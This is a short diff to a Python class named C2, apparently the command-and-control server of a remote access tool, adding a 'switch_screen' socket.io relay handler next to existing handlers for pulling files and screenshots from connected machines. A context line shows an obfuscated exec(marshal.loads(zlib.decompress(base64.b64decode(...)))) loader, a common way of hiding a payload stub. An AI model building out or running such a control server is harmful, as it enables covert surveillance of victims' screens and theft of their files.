@@ -30,6 +30,7 @@ class C2:
         self.sio.on("download_file_return", self.save_file)
         self.sio.on("screen_status", self.screen_status)
         self.sio.on("screenshot", self.screenshot_taken)
+        self.sio.on("switch_screen", self.switch_screen)
 
         print(f"Current time: {datetime.datetime.utcnow()}")
 
@@ -326,3 +327,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
     def screenshot_taken(self, sid, data):
         print(sid)
         self.sio.emit("screenshot", data)
+
+    def switch_screen(self, sid, data):
+        self.sio.emit("switch_screen", data)
